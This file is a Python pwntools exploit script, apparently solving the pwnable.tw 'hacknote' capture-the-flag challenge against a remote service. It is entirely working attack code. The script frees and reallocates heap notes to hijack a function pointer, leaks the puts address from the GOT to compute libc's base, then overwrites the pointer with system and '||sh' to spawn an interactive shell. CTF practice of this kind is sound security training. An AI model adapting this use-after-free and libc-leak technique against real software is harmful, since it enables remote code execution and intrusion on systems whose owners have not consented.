from pwn import *

context(terminal = ['deepin-terminal','-x','sh','-c'],log_level = 'debug',arch = 'i386',os = 'linux')


debug = 0
ElfPath = './hacknote'
LibcPath = 'libc_32.so.6'
RemoteAddr = 'chall.pwnable.tw'
RemotePort = '10102'

elf = ELF(ElfPath)
if debug:
    sh = process(ElfPath)
    libc = elf.libc
else:
    sh = remote(RemoteAddr,RemotePort)
    if LibcPath:
       libc = ELF(LibcPath)

def add(size,content):
    sh.sendlineafter('choice :','1')
    sh.sendlineafter('size :',str(size))
    sh.sendafter('Content :',str(content))

def delete(idx):
    sh.sendlineafter('choice :','2')
    sh.sendlineafter('Index :',str(idx))

def show(idx):
    sh.sendlineafter('choice :','3')
    sh.sendlineafter('Index :',str(idx))
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
output_addr = 0x804862B

add(0x10,'a')
add(0x18,'b')
delete(0)
delete(1)

if debug:
    gdb.attach(sh)
add(0x8,p32(output_addr) + p32(puts_got))
show(0)
puts_addr = u32(sh.recv(4))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + libc.search('/bin/sh').next()

log.info('==========>{:#X}'.format(libc_base))

delete(2)

add(0x8,p32(system_addr)+'||sh')
show(0)

sh.interactive()
sh.close()

